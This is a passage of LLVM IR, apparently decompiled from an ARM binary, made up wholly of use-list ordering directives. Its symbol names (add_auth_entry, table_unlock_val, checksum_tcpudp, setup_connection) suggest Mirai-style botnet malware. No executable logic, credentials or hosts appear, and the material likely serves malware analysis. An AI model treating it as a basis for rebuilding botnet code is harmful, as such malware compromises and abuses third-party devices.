  uselistorder i32 %v1_112b4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_11250, { 1, 0 }
  uselistorder i8 %v3_11248, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11240, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11240, { 0, 2, 1 }
  uselistorder i32 %v0_11238, { 1, 0 }
  uselistorder i1 %v7_11234, { 1, 0 }
  uselistorder i1 %v7_1122c, { 1, 0 }
  uselistorder i1 %v7_11224, { 1, 0 }
  uselistorder i1 %v7_11210, { 1, 0 }
  uselistorder i1 %v7_11208, { 1, 0 }
  uselistorder i1 %v7_11200, { 1, 0 }
  uselistorder i1 %v8_111f8, { 1, 0 }
  uselistorder i32 %v1_111e0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_1117c, { 1, 0 }
  uselistorder i8 %v3_11174, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1116c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1116c, { 0, 2, 1 }
  uselistorder i32 %v0_11164, { 1, 0 }
  uselistorder i1 %v7_11160, { 1, 0 }
  uselistorder i1 %v7_11158, { 1, 0 }
  uselistorder i1 %v7_11150, { 1, 0 }
  uselistorder i1 %v7_1113c, { 1, 0 }
  uselistorder i1 %v7_11134, { 1, 0 }
  uselistorder i1 %v7_1112c, { 1, 0 }
  uselistorder i1 %v8_11124, { 1, 0 }
  uselistorder i32 %v1_1110c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_110a8, { 1, 0 }
  uselistorder i8 %v3_110a0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11098, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_11098, { 0, 2, 1 }
  uselistorder i32 %v0_11090, { 1, 0 }
  uselistorder i1 %v7_1108c, { 1, 0 }
  uselistorder i1 %v7_11084, { 1, 0 }
  uselistorder i1 %v7_1107c, { 1, 0 }
  uselistorder i1 %v7_11068, { 1, 0 }
  uselistorder i1 %v7_11060, { 1, 0 }
  uselistorder i1 %v7_11058, { 1, 0 }
  uselistorder i1 %v8_11050, { 1, 0 }
  uselistorder i32 %v1_11038, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10fd4, { 1, 0 }
  uselistorder i8 %v3_10fcc, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10fc4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10fc4, { 0, 2, 1 }
  uselistorder i32 %v0_10fbc, { 1, 0 }
  uselistorder i1 %v7_10fb8, { 1, 0 }
  uselistorder i1 %v7_10fb0, { 1, 0 }
  uselistorder i1 %v7_10fa8, { 1, 0 }
  uselistorder i1 %v7_10f94, { 1, 0 }
  uselistorder i1 %v7_10f8c, { 1, 0 }
  uselistorder i1 %v7_10f84, { 1, 0 }
  uselistorder i1 %v8_10f7c, { 1, 0 }
  uselistorder i32 %v1_10f64, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10f00, { 1, 0 }
  uselistorder i8 %v3_10ef8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10ef0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10ef0, { 0, 2, 1 }
  uselistorder i32 %v0_10ee8, { 1, 0 }
  uselistorder i1 %v7_10ee4, { 1, 0 }
  uselistorder i1 %v7_10edc, { 1, 0 }
  uselistorder i1 %v7_10ed4, { 1, 0 }
  uselistorder i1 %v7_10ec0, { 1, 0 }
  uselistorder i1 %v7_10eb8, { 1, 0 }
  uselistorder i1 %v7_10eb0, { 1, 0 }
  uselistorder i1 %v8_10ea8, { 1, 0 }
  uselistorder i32 %v1_10e90, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_10e7c, { 1, 2, 0 }
  uselistorder i32 %v2_10e68, { 1, 0 }
  uselistorder i32 %v0_10e68, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_10e64, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_10e3c, { 2, 1, 0 }
  uselistorder i1 %v7_10e18, { 1, 0 }
  uselistorder i32 %v4_10e14, { 1, 0, 2 }
  uselistorder i32 %v1_10dd4, { 0, 2, 3, 4, 1 }
  uselistorder i1 %v1_10db0, { 1, 0 }
  uselistorder i32 %v1_10da4, { 2, 1, 0 }
  uselistorder i32 %v1_10da0, { 1, 0 }
  uselistorder i32 %v0_10d44, { 2, 21, 4, 3, 20, 19, 5, 6, 23, 7, 8, 22, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 1, 0 }
  uselistorder i32 %v1_10d20, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10d1c, { 1, 0 }
  uselistorder i32 %v4_10d00, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_10cec, { 1, 0, 2 }
  uselistorder i32 %v3_10ce8, { 1, 0, 2 }
  uselistorder i32 %v0_116f0, { 1, 0, 2 }
  uselistorder i32 %v3_10cb4, { 1, 0 }
  uselistorder i32 %v1_10c98, { 3, 2, 1, 0 }
  uselistorder i32 %v3_10c94, { 1, 0 }
  uselistorder i32 %v3_10c8c, { 1, 2, 0 }
  uselistorder i1 %v7_10c78, { 1, 0 }
  uselistorder i32 %v3_10c74, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_10c68, { 1, 0 }
  uselistorder i32 %v2_1167c, { 1, 0, 2, 3 }
  uselistorder i32* %v2_1135c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_11354, { 4, 5, 1, 0, 3, 6, 7, 2 }
  uselistorder i32 %v2_11340, { 1, 0, 3, 2, 9, 8, 5, 7, 6, 4 }
  uselistorder i32 %v2_1158c, { 1, 0 }
  uselistorder i32 %v1_10c18, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10c18, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10be4, { 2, 1, 0 }
  uselistorder i32 %v1_10be0, { 1, 0 }
  uselistorder i1 %v2_10bc0, { 1, 0, 2 }
  uselistorder i32 %v0_10bbc, { 1, 0, 2 }
  uselistorder i1 %v7_10b88, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_10b88, { 1, 0, 2 }
  uselistorder i32 %v2_10b80, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10b74, { 1, 0, 2 }
  uselistorder i32 %v0_10b78, { 1, 0 }
  uselistorder i32 %v1_10b5c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10b50, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10b50, { 0, 2, 1 }
  uselistorder i32 %v1_10b40, { 1, 0 }
  uselistorder i32 %v3_11918, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_11928, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_10a90, { 1, 0 }
  uselistorder i32 %v1_10a78, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10a84, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10a34, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_10a28, { 2, 1, 0 }
  uselistorder i32 %v1_10a08, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_109e4, { 1, 0 }
  uselistorder i1 %v9_109b0, { 1, 0 }
  uselistorder i32 %v0_10960, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10904, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_108b4, { 1, 0 }
  uselistorder i32 %v5_1084c, { 1, 0 }
  uselistorder i1 %v2_10794, { 1, 0 }
  uselistorder i1 %v3_10778, { 1, 0, 2 }
  uselistorder i1 %v2_10764, { 1, 0 }
  uselistorder i1 %v2_10740, { 1, 0 }
  uselistorder i32 %v1_106f0, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_106dc, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_106d8, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_106c0, { 1, 0 }
  uselistorder i32 %v0_10698, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 1, 2, 3, 4, 5, 7, 9, 12, 11, 6, 8, 10, 14, 13 }
  uselistorder i16 %v5_f9d0.le, { 0, 2, 1 }
  uselistorder i32 %v0_f9b4, { 3, 2, 0, 1 }
  uselistorder i1 %v7_f954, { 1, 0 }
  uselistorder i32 %v3_f94c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f938, { 1, 0 }
  uselistorder i32 %v0_f908, { 1, 0 }
  uselistorder i32 %storemerge308, { 1, 0 }
  uselistorder i32 %v0_f5b8, { 3, 1, 2, 0, 4 }
  uselistorder i16* %stack_var_-52, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i8* %stack_var_-56, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 6, 7, 8, 0, 9, 1, 10, 4, 11, 2, 12, 3, 13, 5, 14 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 62, 63, 64, 65, 66, 67, 68, 73, 74, 69, 75, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 23, 86, 0, 70, 71, 24, 25, 26, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 72, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 113, 112, 109, 114, 154, 155, 115, 116, 156, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 157, 133, 134, 135, 136, 138, 137, 140, 139, 153, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152 }
  uselistorder i32* %r2.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 51, 52, 53, 54, 10, 0, 46, 47, 11, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 48, 49, 278, 281, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 273, 275, 67, 68, 70, 69, 66, 291, 71, 292, 72, 293, 294, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 295, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 274, 276, 277, 279, 280, 282, 283, 284, 285, 286, 287, 288, 289, 290 }
  uselistorder i32* %r1.global-to-local, { 39, 40, 41, 42, 43, 44, 45, 54, 46, 47, 48, 49, 55, 56, 57, 8, 1, 2, 50, 51, 9, 10, 0, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 275, 276, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 256, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 277, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274 }
  uselistorder i32* %r0.global-to-local, {}
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 131, 108, 109, 126, 127, 132, 133, 145, 218, 212, 31, 32, 34, 110, 217, 112, 114, 115, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 121, 113, 19, 20, 25, 21, 22, 23, 24, 26, 27, 28, 29, 30, 33, 111, 35, 41, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 51, 52, 53, 48, 49, 50, 54, 55, 56, 57, 58, 59, 63, 64, 65, 60, 61, 62, 66, 67, 68, 69, 70, 71, 75, 76, 77, 72, 73, 74, 78, 79, 80, 81, 82, 83, 87, 88, 89, 84, 85, 86, 90, 91, 92, 93, 94, 95, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 122, 123, 146, 147, 148, 149, 151, 150, 152, 153, 154, 157, 159, 160, 158, 155, 156, 128, 129, 124, 161, 125, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 120, 194, 195, 196, 197, 198, 220, 199, 200, 201, 219, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 213, 214, 215, 130, 216 }
  uselistorder i1* %cpsr_c.global-to-local, { 125, 105, 106, 126, 120, 121, 127, 139, 210, 203, 28, 29, 31, 107, 208, 108, 110, 111, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 115, 109, 16, 17, 22, 18, 19, 20, 21, 23, 24, 25, 26, 27, 30, 209, 32, 38, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 48, 49, 50, 45, 46, 47, 51, 52, 53, 54, 55, 56, 60, 61, 62, 57, 58, 59, 63, 64, 65, 66, 67, 68, 72, 73, 74, 69, 70, 71, 75, 76, 77, 78, 79, 80, 84, 85, 86, 81, 82, 83, 87, 88, 89, 90, 91, 92, 96, 97, 98, 93, 94, 95, 99, 100, 101, 102, 103, 104, 112, 113, 114, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 116, 117, 140, 141, 142, 143, 144, 145, 146, 149, 151, 152, 150, 147, 148, 122, 123, 118, 153, 119, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 213, 184, 185, 186, 187, 188, 212, 189, 190, 191, 211, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 204, 205, 206, 124, 207 }
  uselistorder i32 ptrtoint (i16** @global_var_271c0.114 to i32), { 4, 0, 1, 3, 2 }
  uselistorder i16** @global_var_246ec.169, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_246ec.169 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 30, { 4, 0, 1, 5, 2, 3, 6 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), { 6, 23, 7, 24, 0, 25, 3, 26, 1, 27, 2, 28, 4, 29, 16, 30, 17, 31, 18, 32, 19, 33, 20, 34, 21, 35, 5, 36, 22, 37, 8, 38, 9, 39, 10, 40, 11, 41, 12, 42, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 12, 11, 10, 9, 8, 7, 6, 28, 24, 23, 27, 26, 25, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14, 15 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13, 14 }
  uselistorder i32 (i32)* @table_lock_val, { 27, 36, 35, 26, 37, 34, 33, 32, 31, 30, 29, 28, 25, 8, 6, 5, 4, 7, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 24, 23, 22, 21, 20, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 23, 21, 24, 22, 20, 19, 18, 17, 16, 2, 1, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 32, 35, 36, 37, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 11, 12, 13, 14, 15, 34, 56, 57, 58, 59, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i32)* @table_unlock_val, { 38, 37, 46, 45, 44, 43, 42, 41, 40, 39, 36, 19, 17, 16, 15, 18, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 35, 34, 33, 32, 31, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 9, 8, 7, 6, 4, 3, 5, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 2, 1, 0 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2, 6, 7, 8, 9, 10 }
  uselistorder i8 2, { 0, 2, 1, 3 }
  uselistorder i8 5, { 12, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 13, 10, 11 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 4873, { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 54, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 223, { 2, 0, 1 }
  uselistorder i32 127, { 4, 5, 2, 6, 0, 7, 1, 8, 3, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_1b9bc.524 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b894.474 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b85c.462 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b820.446 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b800.438 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b7f8.436 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b7c0.420 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b7b0.416 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b7a8.414 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b78c.406 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b704.378 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b6fc.376 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b6f4.372 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b6d0.364 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b6c0.360 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b694.350 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b684.346 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b67c.344 to i32), { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b648.330 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b624.320 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b5c4.298 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b430.288 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b548.270 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b4f4.252 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b4d4.246 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_1b4c8.244 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b4c0.242 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b4b8.240 to i32), { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1b4ac.236 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_1b49c.234 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b48c.230 to i32), { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1b5c8.226 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b46c.222 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b464.220 to i32), { 1, 7, 2, 8, 0, 9, 3, 4, 5, 10, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1b45c.218 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1b450.216 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1b854.214 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b448.212 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1b440.210 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1b438.208 to i32), { 0, 6, 3, 7, 1, 8, 2, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1b424.204 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_1b414.200 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1b91c.194 to i32), { 7, 46, 8, 47, 9, 48, 10, 49, 0, 50, 11, 51, 12, 52, 13, 53, 1, 54, 2, 55, 3, 56, 14, 57, 4, 58, 15, 59, 5, 60, 16, 61, 17, 62, 18, 63, 6, 64, 19, 65, 20, 66, 21, 67, 22, 68, 23, 69, 24, 70, 25, 71, 26, 72, 27, 73, 28, 74, 29, 75, 30, 76, 31, 77, 32, 78, 33, 79, 34, 80, 35, 81, 36, 82, 37, 83, 38, 84, 39, 85, 40, 86, 41, 42, 43, 87, 44, 88, 45, 89 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
